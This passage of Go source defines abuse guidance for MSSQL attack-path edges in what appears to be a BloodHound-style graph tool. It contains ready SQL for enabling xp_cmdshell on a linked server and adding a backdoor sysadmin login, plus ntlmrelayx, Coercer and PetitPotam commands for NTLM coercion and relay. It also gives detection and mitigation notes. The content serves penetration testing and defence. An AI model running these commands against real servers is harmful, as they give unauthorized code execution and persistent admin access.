    -- Enable xp_cmdshell on the remote server
    EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];
    EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];
    EXEC ('xp_cmdshell ''whoami'';') AT [LinkedServerName];

    -- Or create a new sysadmin login
    EXEC ('CREATE LOGIN [attacker] WITH PASSWORD = ''P@ssw0rd!'';') AT [LinkedServerName];
    EXEC ('ALTER SERVER ROLE [sysadmin] ADD MEMBER [attacker];') AT [LinkedServerName];`,
			LinuxAbuse: `Execute commands on the remote server with admin privileges:
    -- Connect using impacket mssqlclient.py
    -- Then execute linked server queries:
    EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];
    EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];
    EXEC ('xp_cmdshell ''id'';') AT [LinkedServerName];`,
			Opsec: `Linked server queries are logged on both source and target servers. Administrative actions on the remote server are logged as coming from the linked server login.
The target server must have mixed mode authentication enabled for this attack to work with SQL logins.`,
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine
- https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/`,
		}
	},

	EdgeKinds.CoerceAndRelayTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The SQL Server has Extended Protection (EPA) disabled and has a login for a computer account. This allows NTLM relay attacks where any authenticated user can coerce the computer to authenticate to the SQL Server and relay that authentication to gain access as the computer's SQL login.",
			WindowsAbuse: `Perform NTLM coercion and relay to the SQL Server:
    # On the attacker machine, start ntlmrelayx targeting the SQL Server
    ntlmrelayx.py -t mssql://sql.domain.com -smb2support

    # Coerce the victim computer to authenticate using PetitPotam, Coercer, or similar
    python3 Coercer.py -u user -p password -d domain.com -l attacker-ip -t victim-computer

    # ntlmrelayx will relay the authentication to the SQL Server and execute commands`,
			LinuxAbuse: `Perform NTLM coercion and relay to the SQL Server:
    # On the attacker machine, start ntlmrelayx targeting the SQL Server
    ntlmrelayx.py -t mssql://sql.domain.com -smb2support

    # Coerce the victim computer to authenticate using PetitPotam
    python3 PetitPotam.py attacker-ip victim-computer -u user -p password -d domain.com

    # ntlmrelayx will relay the authentication to the SQL Server and execute commands`,
			Opsec: `NTLM relay attacks can be detected by:
    - Windows Event 4624 with Logon Type 3 from unexpected sources
    - SQL Server login events from computer accounts
    - Network traffic analysis showing NTLM authentication
Enable Extended Protection (EPA) on SQL Server to prevent this attack.`,
			References: `- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection
- https://github.com/topotam/PetitPotam
- https://github.com/p0dalirius/Coercer
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py`,
		}
	},
}
